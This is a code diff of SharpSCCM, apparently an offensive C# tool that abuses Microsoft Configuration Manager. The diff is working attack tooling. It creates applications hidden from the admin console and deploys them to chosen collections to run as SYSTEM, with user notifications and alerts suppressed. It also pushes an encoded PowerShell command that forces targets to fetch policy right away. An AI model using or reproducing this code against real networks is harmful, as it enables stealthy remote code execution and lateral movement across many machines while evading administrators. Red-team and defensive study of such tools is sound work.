+                            // $CurrentUser = Get-WmiObject -Query "SELECT UserSID, LogoffTime FROM CCM_UserLogonEvents WHERE LogoffTime=NULL" -Namespace "root\ccm"; $UserID=$CurrentUser.UserSID; $UserID=$UserID.replace("-", "_"); $MessageIDs = "{00000000-0000-0000-0000-000000000026}","{00000000-0000-0000-0000-000000000027}"; ForEach ($MessageID in $MessageIDs) { $ScheduledMessage = ([wmi]"root\ccm\Policy\$UserID\ActualConfig:CCM_Scheduler_ScheduledMessage.ScheduledMessageID=$MessageID"); $ScheduledMessage.Triggers = @("SimpleInterval;Minutes=1;MaxRandomDelayMinutes=0"); $ScheduledMessage.TargetEndpoint = "direct:PolicyAgent_RequestAssignments"; $ScheduledMessage.Put(); $ScheduledMessage.Triggers = @("SimpleInterval;Minutes=15;MaxRandomDelayMinutes=0"); sleep 30; $ScheduledMessage.Put()}
+                            string commandToExecute = "powershell -EncodedCommand JABDAHUAcgByAGUAbgB0AFUAcwBlAHIAIAA9ACAARwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAC0AUQB1AGUAcgB5ACAAIgBTAEUATABFAEMAVAAgAFUAcwBlAHIAUwBJAEQALAAgAEwAbwBnAG8AZgBmAFQAaQBtAGUAIABGAFIATwBNACAAQwBDAE0AXwBVAHMAZQByAEwAbwBnAG8AbgBFAHYAZQBuAHQAcwAgAFcASABFAFIARQAgAEwAbwBnAG8AZgBmAFQAaQBtAGUAPQBOAFUATABMACIAIAAtAE4AYQBtAGUAcwBwAGEAYwBlACAAIgByAG8AbwB0AFwAYwBjAG0AIgA7ACAAJABVAHMAZQByAEkARAA9ACQAQwB1AHIAcgBlAG4AdABVAHMAZQByAC4AVQBzAGUAcgBTAEkARAA7ACAAJABVAHMAZQByAEkARAA9ACQAVQBzAGUAcgBJAEQALgByAGUAcABsAGEAYwBlACgAIgAtACIALAAgACIAXwAiACkAOwAgACQATQBlAHMAcwBhAGcAZQBJAEQAcwAgAD0AIAAiAHsAMAAwADAAMAAwADAAMAAwAC0AMAAwADAAMAAtADAAMAAwADAALQAwADAAMAAwAC0AMAAwADAAMAAwADAAMAAwADAAMAAyADYAfQAiACwAIgB7ADAAMAAwADAAMAAwADAAMAAtADAAMAAwADAALQAwADAAMAAwAC0AMAAwADAAMAAtADAAMAAwADAAMAAwADAAMAAwADAAMgA3AH0AIgA7ACAARgBvAHIARQBhAGMAaAAgACgAJABNAGUAcwBzAGEAZwBlAEkARAAgAGkAbgAgACQATQBlAHMAcwBhAGcAZQBJAEQAcwApACAAewAgACQAUwBjAGgAZQBkAHUAbABlAGQATQBlAHMAcwBhAGcAZQAgAD0AIAAoAFsAdwBtAGkAXQAiAHIAbwBvAHQAXABjAGMAbQBcAFAAbwBsAGkAYwB5AFwAJABVAHMAZQByAEkARABcAEEAYwB0AHUAYQBsAEMAbwBuAGYAaQBnADoAQwBDAE0AXwBTAGMAaABlAGQAdQBsAGUAcgBfAFMAYwBoAGUAZAB1AGwAZQBkAE0AZQBzAHMAYQBnAGUALgBTAGMAaABlAGQAdQBsAGUAZABNAGUAcwBzAGEAZwBlAEkARAA9ACQATQBlAHMAcwBhAGcAZQBJAEQAIgApADsAIAAkAFMAYwBoAGUAZAB1AGwAZQBkAE0AZQBzAHMAYQBnAGUALgBUAHIAaQBnAGcAZQByAHMAIAA9ACAAQAAoACIAUwBpAG0AcABsAGUASQBuAHQAZQByAHYAYQBsADsATQBpAG4AdQB0AGUAcwA9ADEAOwBNAGEAeABSAGEAbgBkAG8AbQBEAGUAbABhAHkATQBpAG4AdQB0AGUAcwA9ADAAIgApADsAIAAkAFMAYwBoAGUAZAB1AGwAZQBkAE0AZQBzAHMAYQBnAGUALgBUAGEAcgBnAGUAdABFAG4AZABwAG8AaQBuAHQAIAA9ACAAIgBkAGkAcgBlAGMAdAA6AFAAbwBsAGkAYwB5AEEAZwBlAG4AdABfAFIAZQBxAHUAZQBzAHQAQQBzAHMAaQBnAG4AbQBlAG4AdABzACIAOwAgACQAUwBjAGgAZQBkAHUAbABlAGQATQBlAHMAcwBhAGcAZQAuAFAAdQB0ACgAKQA7ACAAJABTAGMAaABlAGQAdQBsAGUAZABNAGUAcwBzAGEAZwBlAC4AVAByAGkAZwBnAGUAcgBzACAAPQAgAEAAKAAiAFMAaQBtAHAAbABlAEkAbgB0AGUAcgB2AGEAbAA7AE0AaQBuAHUAdABlAHMAPQAxADUAOwBNAGEAeABSAGEAbgBkAG8AbQBEAGUAbABhAHkATQBpAG4AdQB0AGUAcwA9ADAAIgApADsAIABzAGwAZQBlAHAAIAAzADAAOwAgACQAUwBjAGgAZQBkAHUAbABlAGQATQBlAHMAcwBhAGcAZQAuAFAAdQB0ACgAKQB9AA==";
+                            Exec(wmiConnection, collectionId, collectionName, applicationPath: commandToExecute, runAsUser: false);
+                        }
+                        // Run policy retrieval and evaluation cycle on the primary device for each user in user collections
+                        else if ((uint)collection["CollectionType"] == 1)
+                        {
+                            foreach (ManagementObject collectionMember in collectionMembers)
+                            {
+                                UpdateUserPolicyForDevice(wmiConnection, resourceId: collectionMember["ResourceID"].ToString());
+                            }
+                        }
+                    }
+                }
+            }
+            else if (!string.IsNullOrEmpty(deviceName) || !string.IsNullOrEmpty(resourceId) || !string.IsNullOrEmpty(userName))
+            {
+                UpdateUserPolicyForDevice(wmiConnection, deviceName, resourceId, userName);
+            }
+        }
+
+        public static void UpdateUserPolicyForDevice(ManagementScope wmiConnection, string deviceName = null, string resourceId = null, string userName = null)
+        {
+            if (!string.IsNullOrEmpty(resourceId) || !string.IsNullOrEmpty(userName))
+            {
+                ManagementObject userDevice = GetPrimaryDeviceForUser(wmiConnection, resourceId, userName).OfType<ManagementObject>().First();
+                Console.WriteLine($"[+] Forcing {userDevice["ResourceName"]} ({userDevice["ResourceID"]}) to retrieve user policy and execute any new applications available for {userDevice["UniqueUserName"]}");
+                deviceName = userDevice["ResourceName"].ToString();
+            }
+            // $CurrentUser = Get-WmiObject -Query "SELECT UserSID, LogoffTime FROM CCM_UserLogonEvents WHERE LogoffTime=NULL" -Namespace "root\ccm"; $UserID=$CurrentUser.UserSID; $UserID=$UserID.replace("-", "_"); $MessageIDs = "{00000000-0000-0000-0000-000000000026}","{00000000-0000-0000-0000-000000000027}"; ForEach ($MessageID in $MessageIDs) { $ScheduledMessage = ([wmi]"root\ccm\Policy\$UserID\ActualConfig:CCM_Scheduler_ScheduledMessage.ScheduledMessageID=$MessageID"); $ScheduledMessage.Triggers = @("SimpleInterval;Minutes=1;MaxRandomDelayMinutes=0"); $ScheduledMessage.TargetEndpoint = "direct:PolicyAgent_RequestAssignments"; $ScheduledMessage.Put(); $ScheduledMessage.Triggers = @("SimpleInterval;Minutes=15;MaxRandomDelayMinutes=0"); sleep 30; $ScheduledMessage.Put()}
+            string commandToExecute = "powershell -EncodedCommand JABDAHUAcgByAGUAbgB0AFUAcwBlAHIAIAA9ACAARwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAC0AUQB1AGUAcgB5ACAAIgBTAEUATABFAEMAVAAgAFUAcwBlAHIAUwBJAEQALAAgAEwAbwBnAG8AZgBmAFQAaQBtAGUAIABGAFIATwBNACAAQwBDAE0AXwBVAHMAZQByAEwAbwBnAG8AbgBFAHYAZQBuAHQAcwAgAFcASABFAFIARQAgAEwAbwBnAG8AZgBmAFQAaQBtAGUAPQBOAFUATABMACIAIAAtAE4AYQBtAGUAcwBwAGEAYwBlACAAIgByAG8AbwB0AFwAYwBjAG0AIgA7ACAAJABVAHMAZQByAEkARAA9ACQAQwB1AHIAcgBlAG4AdABVAHMAZQByAC4AVQBzAGUAcgBTAEkARAA7ACAAJABVAHMAZQByAEkARAA9ACQAVQBzAGUAcgBJAEQALgByAGUAcABsAGEAYwBlACgAIgAtACIALAAgACIAXwAiACkAOwAgACQATQBlAHMAcwBhAGcAZQBJAEQAcwAgAD0AIAAiAHsAMAAwADAAMAAwADAAMAAwAC0AMAAwADAAMAAtADAAMAAwADAALQAwADAAMAAwAC0AMAAwADAAMAAwADAAMAAwADAAMAAyADYAfQAiACwAIgB7ADAAMAAwADAAMAAwADAAMAAtADAAMAAwADAALQAwADAAMAAwAC0AMAAwADAAMAAtADAAMAAwADAAMAAwADAAMAAwADAAMgA3AH0AIgA7ACAARgBvAHIARQBhAGMAaAAgACgAJABNAGUAcwBzAGEAZwBlAEkARAAgAGkAbgAgACQATQBlAHMAcwBhAGcAZQBJAEQAcwApACAAewAgACQAUwBjAGgAZQBkAHUAbABlAGQATQBlAHMAcwBhAGcAZQAgAD0AIAAoAFsAdwBtAGkAXQAiAHIAbwBvAHQAXABjAGMAbQBcAFAAbwBsAGkAYwB5AFwAJABVAHMAZQByAEkARABcAEEAYwB0AHUAYQBsAEMAbwBuAGYAaQBnADoAQwBDAE0AXwBTAGMAaABlAGQAdQBsAGUAcgBfAFMAYwBoAGUAZAB1AGwAZQBkAE0AZQBzAHMAYQBnAGUALgBTAGMAaABlAGQAdQBsAGUAZABNAGUAcwBzAGEAZwBlAEkARAA9ACQATQBlAHMAcwBhAGcAZQBJAEQAIgApADsAIAAkAFMAYwBoAGUAZAB1AGwAZQBkAE0AZQBzAHMAYQBnAGUALgBUAHIAaQBnAGcAZQByAHMAIAA9ACAAQAAoACIAUwBpAG0AcABsAGUASQBuAHQAZQByAHYAYQBsADsATQBpAG4AdQB0AGUAcwA9ADEAOwBNAGEAeABSAGEAbgBkAG8AbQBEAGUAbABhAHkATQBpAG4AdQB0AGUAcwA9ADAAIgApADsAIAAkAFMAYwBoAGUAZAB1AGwAZQBkAE0AZQBzAHMAYQBnAGUALgBUAGEAcgBnAGUAdABFAG4AZABwAG8AaQBuAHQAIAA9ACAAIgBkAGkAcgBlAGMAdAA6AFAAbwBsAGkAYwB5AEEAZwBlAG4AdABfAFIAZQBxAHUAZQBzAHQAQQBzAHMAaQBnAG4AbQBlAG4AdABzACIAOwAgACQAUwBjAGgAZQBkAHUAbABlAGQATQBlAHMAcwBhAGcAZQAuAFAAdQB0ACgAKQA7ACAAJABTAGMAaABlAGQAdQBsAGUAZABNAGUAcwBzAGEAZwBlAC4AVAByAGkAZwBnAGUAcgBzACAAPQAgAEAAKAAiAFMAaQBtAHAAbABlAEkAbgB0AGUAcgB2AGEAbAA7AE0AaQBuAHUAdABlAHMAPQAxADUAOwBNAGEAeABSAGEAbgBkAG8AbQBEAGUAbABhAHkATQBpAG4AdQB0AGUAcwA9ADAAIgApADsAIABzAGwAZQBlAHAAIAAzADAAOwAgACQAUwBjAGgAZQBkAHUAbABlAGQATQBlAHMAcwBhAGcAZQAuAFAAdQB0ACgAKQB9AA==";
+            Exec(wmiConnection, deviceName: deviceName, applicationPath: commandToExecute, runAsUser: false, collectionType: "device");
+        }
+
+        public static ManagementObject NewApplication(ManagementScope wmiConnection, string name, string path, bool runAsUser = false, bool show = false)
+        {
+            ManagementObject application = null;
+
             // Check for existing application before creating a new one
-            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM SMS_Application WHERE LocalizedDisplayName='{name}'"));
-            ManagementObjectCollection applications = searcher.Get();
+            ManagementObjectCollection applications = MgmtUtil.GetClassInstances(wmiConnection, "SMS_Application", whereCondition: $"LocalizedDisplayName='{name}'");
             if (applications.Count > 0)
             {
-                foreach (ManagementObject application in applications)
-                {
-                    Console.WriteLine($"[+] There is already an application with the name {name}");
-                }
+                Console.WriteLine($"[+] There is already an application with the name {name}");
             }
             else
             {
                 Console.WriteLine($"[+] Creating new application: {name}");
-                ManagementClass idInstance = new ManagementClass(scope, new ManagementPath("SMS_Identification"), null);
+                Console.WriteLine($"[+] Application path: {path}");
+                ManagementClass idInstance = new ManagementClass(wmiConnection, new ManagementPath("SMS_Identification"), null);
                 ManagementBaseObject outParams = idInstance.InvokeMethod("GetSiteID", null, null);
                 string siteId = outParams["SiteID"].ToString().Replace("{", "").Replace("}", "");
                 string scopeId = $"ScopeId_{siteId}";
@@ -358,7 +799,7 @@ namespace SharpSCCM
                                             <Filter>asdf</Filter>
                                         </File>
                                     </Settings>
-                                    <Rule xmlns=""http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules"" id=""{scope}/{deploymentId}"" Severity=""Informational"" NonCompliantWhenSettingIsNotFound=""false"">
+                                    <Rule xmlns=""http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules"" id=""{scopeId}/{deploymentId}"" Severity=""Informational"" NonCompliantWhenSettingIsNotFound=""false"">
                                         <Annotation>
                                             <DisplayName Text=""""/><Description Text=""""/>
                                         </Annotation>
@@ -397,10 +838,10 @@ namespace SharpSCCM
                 //Application appInstance = SccmSerializer.DeserializeFromString(xml, true);
                 //string xmla = SccmSerializer.SerializeToString(appInstance, true);
 
-                ManagementObject application = new ManagementClass(scope, new ManagementPath("SMS_Application"), null).CreateInstance();
+                application = new ManagementClass(wmiConnection, new ManagementPath("SMS_Application"), null).CreateInstance();
                 //application["SDMPackageXML"] = xmla;
                 application["SDMPackageXML"] = xml;
-                if (stealth)
+                if (!show)
                 {
                     application["IsHidden"] = true;
                     Console.WriteLine("[+] Updated application to hide it from the Configuration Manager console");
@@ -409,27 +850,37 @@ namespace SharpSCCM
                 {
                     Console.WriteLine("[+] Updated application to run in the context of the logged on user");
                 }
+                else
+                {
+                    Console.WriteLine("[+] Updated application to run as SYSTEM");
+                }
                 try
                 {
                     application.Put();
+                    ManagementObjectCollection createdApplications = MgmtUtil.GetClassInstances(wmiConnection, "SMS_Application", null, false, null, $"LocalizedDisplayName='{name}'");
+                    if (createdApplications.Count > 0)
+                    {
+                        Console.WriteLine("[+] Successfully created application");
+                    }
+                    else
+                    {
+                        Console.WriteLine("[!] The application was not found after creation");
+                    }
                 }
                 catch (ManagementException ex)
                 {
                     Console.WriteLine($"[!] An exception occurred while attempting to commit the changes: {ex.Message}");
-                    Console.WriteLine("[!] Does your account have the correct permissions?");
+                    Console.WriteLine("[!] Is your account assigned the correct security role?");
                 }
-                catch (Exception ex)
-                {
-                    Console.WriteLine($"An unhandled exception of type {ex.GetType()} occurred: {ex.Message}");
-                }
-                MgmtUtil.GetClassInstances(scope, "SMS_Application", false, null, $"LocalizedDisplayName='{name}'");
             }
+            return application;
         }
 
-        public static void NewCollection(ManagementScope scope, string collectionType, string collectionName)
+        public static ManagementObject NewCollection(ManagementScope wmiConnection, string collectionType, string collectionName)
         {
+            ManagementObject returnedCollection = null;
             Console.WriteLine($"[+] Creating new {collectionType} collection: {collectionName}");
-            ManagementObject collection = new ManagementClass(scope, new ManagementPath("SMS_Collection"), null).CreateInstance();
+            ManagementObject collection = new ManagementClass(wmiConnection, new ManagementPath("SMS_Collection"), null).CreateInstance();
             collection["Name"] = collectionName;
             collection["OwnedByThisSite"] = true;
             if (collectionType == "device")
@@ -445,95 +896,209 @@ namespace SharpSCCM
             try
             {
                 collection.Put();
+                ManagementObjectCollection createdCollections = MgmtUtil.GetClassInstances(wmiConnection, "SMS_Collection", null, false, null, $"Name='{collectionName}'");
+                if (createdCollections.Count == 1)
+                {
+                    Console.WriteLine("[+] Successfully created collection");
+                    foreach (ManagementObject createdCollection in createdCollections)
+                    {
+                        return createdCollection;
+                    }
+                }
+                else if (createdCollections.Count > 1)
+                {
+                    Console.WriteLine($"[!] Found {createdCollections.Count} collections named {collectionName}");
+                }
+                else
+                {
+                    Console.WriteLine("[!] The collection was not found after creation");
+                }
             }
             catch (ManagementException ex)
             {
                 Console.WriteLine($"[!] An exception occurred while attempting to commit the changes: {ex.Message}");
-                Console.WriteLine("[!] Does your account have the correct permissions?");
+                Console.WriteLine("[!] Is your account assigned the correct security role?");
             }
-            catch (Exception ex)
-            {
-                Console.WriteLine($"An unhandled exception of type {ex.GetType()} occurred: {ex.Message}");
-            }            
-            MgmtUtil.GetClassInstances(scope, "SMS_Collection", false, null, $"Name='{collectionName}'");
+            return returnedCollection;
         }
 
-        public static void NewDeployment(ManagementScope scope, string application, string collection)
+        public static ManagementObject NewCollectionMember(ManagementScope wmiConnection, string collectionName = null, string collectionType = null, string collectionId = null, string deviceName = null, string userName = null, string resourceId = null, int waitTime = 15)
         {
-            // Check for existing deployment before creating a new one
-            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM SMS_ApplicationAssignment WHERE ApplicationName='{application}' AND CollectionName='{collection}'"));
-            ManagementObjectCollection deployments = searcher.Get();
-            if (deployments.Count > 0)
-            {
-                foreach (ManagementObject deployed in deployments)
-                {
-                    Console.WriteLine($"[+] {application} already deployed to {collection}");
-                }
-            }
-            else
-            {
-                Console.WriteLine($"[+] Creating new deployment of {application} to {collection}");
-                string siteCode = scope.Path.ToString().Split('_').Last();
-                string now = DateTime.Now.ToString("yyyyMMddHHmmss" + ".000000+***");
-                ManagementObject deployment = new ManagementClass(scope, new ManagementPath("SMS_ApplicationAssignment"), null).CreateInstance();
-                deployment["ApplicationName"] = application;
-                deployment["AssignmentName"] = $"{application}_{collection}_Install";
-                deployment["AssignmentAction"] = 2; // APPLY
-                deployment["AssignmentType"] = 2; // Application
-                deployment["CollectionName"] = collection;
-                deployment["DesiredConfigType"] = 1; // REQUIRED
-                deployment["DisableMOMAlerts"] = true;
-                deployment["EnforcementDeadline"] = now;
-                deployment["LogComplianceToWinEvent"] = false;
-                deployment["NotifyUser"] = false;
-                deployment["OfferTypeID"] = 0; // REQUIRED
-                deployment["OverrideServiceWindows"] = true;
-                deployment["Priority"] = 2; // HIGH
-                deployment["RebootOutsideOfServiceWindows"] = false;
-                deployment["SoftDeadlineEnabled"] = true;
-                deployment["SourceSite"] = siteCode;
-                deployment["StartTime"] = now;
-                deployment["SuppressReboot"] = 0;
-                deployment["UseGMTTimes"] = true;
-                deployment["UserUIExperience"] = false; // Do not display user notifications
-                deployment["WoLEnabled"] = false; // Not including this one results in errors displayed in the console
+            ManagementObject collectionMember = null;
 
-                searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM SMS_Application WHERE LocalizedDisplayName='{application}'"));
-                ManagementObjectCollection applications = searcher.Get();
-                Console.WriteLine($"[+] Found {applications.Count} applications named {application}");
-                if (applications.Count > 0)
+            // Use the provided collection type or set to device/user depending on which was provided
+            collectionType = !string.IsNullOrEmpty(deviceName) ? "device" : !string.IsNullOrEmpty(userName) ? "user" : collectionType;
+
+            // Check whether the specified collection exists
+            ManagementObject collection = GetCollection(wmiConnection, collectionName, collectionId);
+            if (collection != null)
+            {
+                // Check if the resource is already a member of the collection
+                ManagementObjectCollection existingMembers = GetCollectionMembers(wmiConnection, collectionName, collectionId, printOutput: false);
+                if (existingMembers.Count > 0)
                 {
-                    foreach (ManagementObject applicationObj in applications)
+                    foreach (ManagementObject existingMember in existingMembers)
                     {
-                        deployment["AssignedCIs"] = new Int32[] { Convert.ToInt32(applicationObj.Properties["CI_ID"].Value) };
+                        if (!string.IsNullOrEmpty(deviceName) && (string)existingMember.GetPropertyValue("Name") == deviceName)
+                        {
+                            Console.WriteLine($"[!] A device named {deviceName} is already a member of the collection");
+                            return null;
+                        }
+                        else if (!string.IsNullOrEmpty(userName) && existingMember.GetPropertyValue("Name").ToString().Contains(userName))
+                        {
+                            Console.WriteLine($"[!] A user named {existingMember.GetPropertyValue("Name")} is already a member of the collection");
+                            return null;
+                        }
+                        else if (!string.IsNullOrEmpty(resourceId) && (uint)existingMember.GetPropertyValue("ResourceID") == Convert.ToUInt32(resourceId))
+                        {
+                            Console.WriteLine($"[!] A resource with ID {resourceId} is already a member of the collection");
+                            return null;
+                        }
                     }
                 }
-
-                searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM SMS_Collection WHERE Name='{collection}'"));
-                ManagementObjectCollection collections = searcher.Get();
-                Console.WriteLine($"[+] Found {collections.Count} collections named {collection}");
-                if (collections.Count > 0)
+                // Check whether the specified resource exists
+                ManagementObject matchingResource = GetDeviceOrUser(wmiConnection, deviceName, resourceId, userName, true);
+                if (matchingResource != null)
                 {
-                    foreach (ManagementObject collectionObj in collections)
+                    if ((uint)collection.Properties[propertyName: "CollectionType"].Value == 1 && collectionType == "device")
                     {
-                        deployment["TargetCollectionID"] = collectionObj.GetPropertyValue("CollectionID");
+                        Console.WriteLine("[!] Can't add a device to a user collection");
+                    }
+                    else if ((uint)collection.Properties["CollectionType"].Value == 2 && collectionType == "user")
+                    {
+                        Console.WriteLine("[!] Can't add a user to a device collection");
+                    }
+                    else
+                    {
+                        ManagementObject newCollectionRule = new ManagementClass(wmiConnection, new ManagementPath("SMS_CollectionRuleQuery"), null).CreateInstance();
+                        string membershipQuery = $"SELECT * FROM {(collectionType == "device" ? "SMS_R_System" : collectionType == "user" ? "SMS_R_User" : null)} WHERE ResourceID='{matchingResource["ResourceID"]}'";
+                        newCollectionRule["QueryExpression"] = membershipQuery;
+                        newCollectionRule["RuleName"] = $"{collectionType}_{Guid.NewGuid()}";
+                        ManagementBaseObject addMembershipRuleParams = collection.GetMethodParameters("AddMembershipRule");
+                        addMembershipRuleParams.SetPropertyValue("collectionRule", newCollectionRule);
+                        try
+                        {
+                            collection.InvokeMethod("AddMembershipRule", addMembershipRuleParams, null);
+                            Console.WriteLine($"[+] Added {matchingResource["Name"]} {matchingResource["ResourceID"]} to {(!string.IsNullOrEmpty(collectionName) ? collectionName : collectionId)}");
+                            Console.WriteLine($"[+] Waiting for new collection member to become available...");
+                            bool memberAvailable = false;
+                            while (!memberAvailable)
+                            {
+                                Thread.Sleep(millisecondsTimeout: 5000);
+                                ManagementObjectCollection collectionMembers = GetCollectionMembers(wmiConnection, collectionName, collectionId);
+                                if (collectionMembers.Count == 1)
+                                {
+                                    Console.WriteLine($"[+] Successfully added {matchingResource["Name"]} {matchingResource["ResourceID"]} to {(!string.IsNullOrEmpty(collectionName) ? collectionName : collectionId)}");
+                                    memberAvailable = true;
+                                    collectionMember = collectionMembers.Cast<ManagementObject>().First();
+                                }
+                                else
+                                {
+                                    Console.WriteLine("[+] New collection member is not available yet... trying again in 5 seconds");
+                                }
+                            }
+                        }
+                        catch (ManagementException ex)
+                        {
+                            Console.WriteLine($"[!] An exception occurred while attempting to commit the changes: {ex.Message}");
+                            Console.WriteLine("[!] Is your account assigned the correct security role?");
+                        }
                     }
                 }
-                try
+                else
                 {
-                    deployment.Put();
+                    Console.WriteLine($"[!] Found 0 instances of the specified device or user with ResourceID {resourceId}");
                 }
-                catch (ManagementException ex)
-                {
-                    Console.WriteLine($"[!] An exception occurred while attempting to commit the changes: {ex.Message}");
-                    Console.WriteLine("[!] Does your account have the correct permissions?");
-                }
-                catch (Exception ex)
-                {
-                    Console.WriteLine($"An unhandled exception of type {ex.GetType()} occurred: {ex.Message}");
-                }
-                MgmtUtil.GetClassInstances(scope, "SMS_ApplicationAssignment", false, null, $"ApplicationName='{application}' AND CollectionName='{collection}'");
             }
+            return collectionMember;
+        }
+
+        public static ManagementObject NewDeployment(ManagementScope wmiConnection, string applicationName, string collectionName, string collectionId)
+        {
+            ManagementObject deployment = null;
+
+            // Check if the collection is unique
+            ManagementObject collection = GetCollection(wmiConnection, collectionName, collectionId);
+            if (collection != null)
+            {
+                // Check for existing deployment before creating a new one
+                ManagementObjectCollection deployments = MgmtUtil.GetClassInstances(wmiConnection, "SMS_ApplicationAssignment", $"SELECT * FROM SMS_ApplicationAssignment WHERE ApplicationName='{applicationName}' AND TargetCollectionID='{collection["CollectionID"]}'");
+                if (deployments.Count > 0)
+                {
+                    foreach (ManagementObject existingDeployment in deployments)
+                    {
+                        Console.WriteLine($"[!] Application {applicationName} is already assigned to collection {collection["Name"]} ({collection["CollectionID"]}) in deployment {existingDeployment["AssignmentName"]}");
+                    }
+                }
+                else
+                {
+                    Console.WriteLine($"[+] Creating new deployment of {applicationName} to {collection["Name"]} ({collection["CollectionID"]})");
+                    string siteCode = wmiConnection.Path.ToString().Split('_').Last();
+                    string now = DateTime.Now.ToString("yyyyMMddHHmmss" + ".000000+***");
+                    deployment = new ManagementClass(wmiConnection, new ManagementPath("SMS_ApplicationAssignment"), null).CreateInstance();
+                    deployment["ApplicationName"] = applicationName;
+                    deployment["AssignmentName"] = $"{applicationName}_{collection["CollectionID"]}_Install";
+                    deployment["AssignmentAction"] = 2; // APPLY
+                    deployment["AssignmentType"] = 2; // Application
+                    deployment["CollectionName"] = collection["Name"];
+                    deployment["DesiredConfigType"] = 1; // REQUIRED
+                    deployment["DisableMOMAlerts"] = true;
+                    deployment["EnforcementDeadline"] = now;
+                    deployment["LogComplianceToWinEvent"] = false;
+                    deployment["NotifyUser"] = false;
+                    deployment["OfferFlags"] = 1; // PREDEPLOY
+                    deployment["OfferTypeID"] = 0; // REQUIRED
+                    deployment["OverrideServiceWindows"] = true;
+                    deployment["Priority"] = 2; // HIGH
+                    deployment["RebootOutsideOfServiceWindows"] = false;
+                    deployment["SoftDeadlineEnabled"] = true;
+                    deployment["SourceSite"] = siteCode;
+                    deployment["StartTime"] = now;
+                    deployment["SuppressReboot"] = 0;
+                    deployment["TargetCollectionID"] = collection["CollectionID"];
+                    deployment["UseGMTTimes"] = true;
+                    // Do not display user notifications
+                    deployment["UserUIExperience"] = false;
+                    // Not including this property results in errors displayed in the console
+                    deployment["WoLEnabled"] = false; 
+
+                    ManagementObjectCollection applications = MgmtUtil.GetClassInstances(wmiConnection, "SMS_Application", $"SELECT * FROM SMS_Application WHERE LocalizedDisplayName='{applicationName}'");
+                    if (applications.Count == 1)
+                    {
+                        Console.WriteLine($"[+] Found the {applicationName} application");
+                        ManagementObject application = applications.OfType<ManagementObject>().First();
+                        deployment["AssignedCIs"] = new Int32[] { Convert.ToInt32(application.Properties["CI_ID"].Value) };
+                        try
+                        {
+                            deployment.Put();
+                            ManagementObjectCollection createdDeployments = MgmtUtil.GetClassInstances(wmiConnection, "SMS_ApplicationAssignment", null, false, null, $"ApplicationName='{applicationName}' AND TargetCollectionID='{collection["CollectionID"]}'");
+                            if (createdDeployments.Count == 1)
+                            {
+                                Console.WriteLine($"[+] Successfully created deployment of {applicationName} to {collection["Name"]} ({collection["CollectionID"]})");
+                                Console.WriteLine($"[+] New deployment name: {createdDeployments.OfType<ManagementObject>().First()["AssignmentName"]}");
+                            }
+                            else if (createdDeployments.Count == 0)
+                            {
+                                Console.WriteLine("[!] The deployment was not found after creation");
+                            }
+                            else
+                            {
+                                Console.WriteLine($"[!] Found {createdDeployments.Count} deployments of {applicationName} to {collection["Name"]} ({collection["CollectionID"]})");
+                            }
+                        }
+                        catch (ManagementException ex)
+                        {
+                            Console.WriteLine($"[!] An exception occurred while attempting to commit the changes: {ex.Message}");
+                            Console.WriteLine("[!] Is your account assigned the correct security role?");
+                        }
+                    }
+                    else
+                    {
+                        Console.WriteLine($"[!] Found {applications.Count} applications named {applicationName}");
+                    }
+                }
+            }
+            return deployment;
         }
     }
 }
